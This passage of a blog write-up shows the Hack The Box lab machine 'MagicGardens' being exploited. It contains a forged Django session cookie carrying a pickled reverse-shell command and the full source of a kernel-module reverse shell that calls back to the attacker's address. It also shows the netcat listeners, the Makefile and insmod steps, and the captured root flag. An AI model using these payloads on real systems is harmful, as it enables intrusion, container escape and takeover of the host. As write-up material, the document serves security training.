</span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=KnmPhMrVtjDryqzyOEJM2Vff5azXv0hX; sessionid=gAWVmgAAAAAAAACMCnN1YnByb2Nlc3OUjARjYWxslJOUXZQojARiYXNolIwCLWOUjGxlY2hvIEwySnBiaTlpWVhOb0lDMWpJQ2N2WW1sdUwySmhjMmdnTFdrZ1BpWWdMMlJsZGk5MFkzQXZNVEF1TVRBdU1UWXVNemt2TkRRME5DQXdQaVl4Snc9PSB8IGJhc2U2NCAtZCB8IGJhc2iUZYWUUpQu:1tgj0G:8N1ldc_ZX9dgBHeT-zRhsMT-jNEo3571F7eL7QE6Zwo</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And we‚Äôre in:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.39] from (UNKNOWN) [10.129.231.24] 60086</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (16): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@5e5026ac6a81:/usr/src/app<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure></div>

<p>However we are only root on the docker container.</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@5e5026ac6a81:/usr/src<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">app</span><br><span class="line">linux-headers-6.1.0-11-amd64</span><br><span class="line">linux-headers-6.1.0-11-common</span><br><span class="line">linux-headers-6.1.0-20-amd64</span><br><span class="line">linux-headers-6.1.0-20-common</span><br><span class="line">linux-kbuild-6.1</span><br><span class="line">root@5e5026ac6a81:/usr/src<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>These files (linux-headers-6.1.0-11-amd64‚Äã or linux-headers-6.1.0-11-common‚Äã) should not appear in the folder, because these files are usually used when compiling kernel. (docker will use containered, which will share the same kernel with the host).</p>
<p>Then gcc and make were also installed on our container, which is sus.</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@5e5026ac6a81:/usr/src<span class="comment"># capsh --print</span></span><br><span class="line"></span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line">Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap=ep</span><br><span class="line">Bounding <span class="built_in">set</span> =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap</span><br><span class="line">Ambient <span class="built_in">set</span> =</span><br><span class="line">Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore</span><br><span class="line">Securebits: 00/0x0/1<span class="string">&#x27;b0 (no-new-privs=0)</span></span><br><span class="line"><span class="string"> secure-noroot: no (unlocked)</span></span><br><span class="line"><span class="string"> secure-no-suid-fixup: no (unlocked)</span></span><br><span class="line"><span class="string"> secure-keep-caps: no (unlocked)</span></span><br><span class="line"><span class="string"> secure-no-ambient-raise: no (unlocked)</span></span><br><span class="line"><span class="string">uid=0(root) euid=0(root)</span></span><br><span class="line"><span class="string">gid=0(root)</span></span><br><span class="line"><span class="string">groups=0(root)</span></span><br><span class="line"><span class="string">Guessed mode: HYBRID (4)</span></span><br></pre></td></tr></table></figure></div>

<p>We can see that there is a cap_sys_module‚Äã, which means we are able to install a module for the host‚Äôs kernel and then implement privilege escalation &#x3D;&gt; <a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation" >https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>We‚Äôll have to create a C reverse shell and a Makefile:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kmod.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;AttackDefense&quot;</span>);</span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;LKM reverse shell module&quot;</span>);</span><br><span class="line"></span><br><span class="line">MODULE_VERSION(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"><span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* envp[] = &#123;<span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// call_usermodehelper function is used to create user mode processes from kernel space</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">reverse_shell_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">reverse_shell_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Exiting\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(reverse_shell_init);</span><br><span class="line">module_exit(reverse_shell_exit);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += reverse-shell.o</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">        $(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">        $(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</span><br></pre></td></tr></table></figure></div>

<p>We‚Äôll now simply run <code>make</code> inside the src folder then insert our new module:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@5e5026ac6a81:/usr/src<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Makefile</span><br><span class="line">Module.symvers</span><br><span class="line">app</span><br><span class="line">linux-headers-6.1.0-11-amd64</span><br><span class="line">linux-headers-6.1.0-11-common</span><br><span class="line">linux-headers-6.1.0-20-amd64</span><br><span class="line">linux-headers-6.1.0-20-common</span><br><span class="line">linux-kbuild-6.1</span><br><span class="line">modules.order</span><br><span class="line">reverse-shell.c</span><br><span class="line">root@5e5026ac6a81:/usr/src<span class="comment"># make</span></span><br><span class="line">make</span><br><span class="line">make -C /lib/modules/6.1.0-20-amd64/build M=/usr/src modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-headers-6.1.0-20-amd64&#x27;</span></span><br><span class="line">  CC [M]  /usr/src/reverse-shell.o</span><br><span class="line">  MODPOST /usr/src/Module.symvers</span><br><span class="line">  CC [M]  /usr/src/reverse-shell.mod.o</span><br><span class="line">  LD [M]  /usr/src/reverse-shell.ko</span><br><span class="line">  BTF [M] /usr/src/reverse-shell.ko</span><br><span class="line">Skipping BTF generation <span class="keyword">for</span> /usr/src/reverse-shell.ko due to unavailability of vmlinux</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-headers-6.1.0-20-amd64&#x27;</span></span><br><span class="line">root@5e5026ac6a81:/usr/src<span class="comment"># insmod reverse-shell.ko</span></span><br><span class="line">insmod reverse-shell.ko</span><br><span class="line">root@5e5026ac6a81:/usr/src<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>And we‚Äôre in:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.39] from (UNKNOWN) [10.129.231.24] 41850</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (-1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@magicgardens:/<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@magicgardens:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">c5c9bc85fb66baaa0bfb5072a793cd1d</span><br><span class="line">root@magicgardens:/<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>And that was it for MagicGardens!<br>-0xkujen</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: MagicGardens</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2025-02-07 19:44:02</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-02-08 14:49:50
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2025/02/07/Hackthebox-MagicGardens/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/02/14/Hackthebox-Cicada/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Cicada</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/01/31/Hackthebox-Trickster/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Trickster</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: MagicGardens</div>
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-magicgardens-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;magicgardens.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-magicgardens-htb-admin"><span class="nav-text">Web Application - http:&#x2F;&#x2F;magicgardens.htb&#x2F;admin </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-Docker-Escape"><span class="nav-text">Privilege Escalation - Docker Escape</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="ÂúñÂ±§_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
